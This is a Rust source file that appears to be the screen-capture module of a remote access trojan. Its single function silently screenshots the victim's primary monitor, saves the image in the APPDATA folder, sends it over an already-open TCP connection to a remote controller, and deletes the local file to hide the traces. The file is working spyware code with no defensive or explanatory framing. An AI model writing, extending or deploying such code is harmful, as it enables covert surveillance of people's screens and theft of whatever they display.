use std::net::TcpStream;
use std::io::Read;
use std::fs::File;

pub fn capture(mut stream: &TcpStream) {
    use std::io::Write;
    use windows_capture::{
        capture::GraphicsCaptureApiHandler,
        frame::Frame,
        graphics_capture_api::InternalCaptureControl,
        monitor::Monitor,
        settings::{ColorFormat, CursorCaptuerSettings, DrawBorderSettings, Settings},
    };

    struct Capture;

    impl GraphicsCaptureApiHandler for Capture {
        type Flags = String;
        type Error = Box<dyn std::error::Error + Send + Sync>;

        fn new(_: Self::Flags) -> Result<Self, Self::Error> {
            Ok(Self)
        }

        fn on_frame_arrived(
            &mut self,
            frame: &mut Frame,
            capture_control: InternalCaptureControl,
        ) -> Result<(), Self::Error> {
            frame.save_as_image(std::env::var("APPDATA").unwrap().clone() + "\\screenshot.png", windows_capture::frame::ImageFormat::Png)?;
            capture_control.stop();
            Ok(())
        }

        fn on_closed(&mut self) -> Result<(), Self::Error> {
            Ok(())
        }
    }

    let primary_monitor = Monitor::primary().expect("There is no primary monitor");
    let settings = Settings::new(
        primary_monitor,
        CursorCaptuerSettings::Default,
        DrawBorderSettings::Default,
        ColorFormat::Rgba8,
        "works".to_string(),
    )
    .unwrap();

    let _ = Capture::start(settings);
    stream.write_all("captured".as_bytes()).unwrap();

    let mut file = File::open(std::env::var("APPDATA").unwrap().clone() + "\\screenshot.png").unwrap();
    let metadata = file.metadata().unwrap();
    let file_size = metadata.len() as usize;

    stream.write_all(file_size.to_string().as_bytes()).unwrap();
    std::thread::sleep(std::time::Duration::from_secs(1));

    let mut buffer = vec![0; file_size];
    file.read_exact(&mut buffer).unwrap();
    stream.write_all(&buffer).unwrap();

    std::fs::remove_file(std::env::var("APPDATA").unwrap().clone() + "\\screenshot.png").unwrap();
}